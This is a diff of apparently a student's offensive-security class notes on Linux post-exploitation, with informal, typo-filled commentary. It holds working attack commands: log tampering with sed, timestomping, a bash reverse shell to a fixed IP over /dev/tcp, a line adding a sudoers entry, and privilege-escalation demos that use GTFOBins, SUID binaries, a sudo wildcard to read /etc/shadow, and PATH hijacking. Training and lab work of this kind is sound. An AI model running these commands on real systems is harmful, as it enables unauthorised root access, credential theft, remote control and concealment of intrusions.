@@ -102,7 +102,7 @@ msfvenom: msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\users\student\d
 ```
 file /var/log/wtmp
 file /var/log -type f -mmin -10 2>/dev/null
-journal -f -u ssh
+journal -f -u ssh  # using journactl following the file of ssh, if theres any ssh activity itll record entries 
 journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
 ```
 #### Cleaning The Logs (Basic)
@@ -120,11 +120,11 @@ journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
 * `cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log`
 ##### Timestomp
 * `touch -c -t 201603051015 1.txt    # Explicit`
-* `touch -r 3.txt 1.txt    # Reference`
+* `touch -r 3.txt 1.txt    # Reference`/ takes a timestamp from another file 
 #### Rsyslog
 * Newer Rsyslog references `/etc/rsyslog.d/*` for settings/rules
 * Older versions only uses `/etc/ryslog.conf`
-* Find out with `grep "IncludeConfig /etc/rsyslog.conf`
+* Find out with `grep "IncludeConfig /etc/rsyslog.conf` DONT USE 
 ```
 kern.*                                                # All kernel messages, all severities
 mail.crit
@@ -139,3 +139,53 @@ watch -n1 'ls -l'
 /bin/bash -i >& /dev/tcp/192.168.28.135/33403 0>&1
 /var/tmp/testbed/unknown /etc/sudoers 'comrade  ALL=(ALL:ALL) ALL'
 ```
+sudo cat /etc/sudoers
+find / -type f -perm /4000 -ls 2>/dev/null
+  cross reference with gtfo bins that can give you a shel, if root owns it you are root
+
+## in action demo 1
+sudo -l  
+    cross reference the binary with gtfobins
+
+sudo apt-get changelog apt 
+!/bin/sh will allow a shell on the device and now we are root 
+
+## demo 2 
+sudo -l 
+as root with NO PASSWD you can run /var/log/syslog* 
+ls -l /var/log/syslog* shows all the log rotations (.gz logs) 
+    star means anything 
+so because star is there, it means any character o we can do: cat /var/log/syslog /etc/shadow (or any file)
+
+## demo 3 
+    cant run it so we see if theres anything with suid or sgid bit with the find command: find / -type f -perm /4000 -ls 2>/dev/null
+
+cros referencing the nice command
+IGNORE THE INSTALL DIRECTORY it already has the suid bit set we dont need it 
+run the nice command with a shell like so: nice /bin/sh -p
+    youre given the # shell which means root do an id to see who we are, EID means effective user id so we are effectively here root 
+
+crontab -l # lists jobs for the user you are 
+crontab -e allows to edit 
+crontab -r allows to remove a crontab
+crontab -u -<other option> <username> allows to check and edit other users jobs 
+    system level jobs are in /etc/crontab
+    user level jobs are in /var/spool/cron/crontabs    #crontabs here typicaly is only accesed by root 
+        ls -l /etc/cron.<h,w,m,d>
+
+# world writeable files
+find / -type d -perm /2 -ls 2>/dev/null # finds directories with the write permision set 
+ls -lisa /tmp      ls -latr puts the most recently written to file at the bottom 
+
+# dot . in path
+PATH=./:$PATH  
+echo $PATH
+
+wayss to figure out init type 
+  ls -latr /proc/1/exe
+  stat /sbin/init
+  man init
+  init --version
+  ps -p 1
+
+  sytemv is system 5
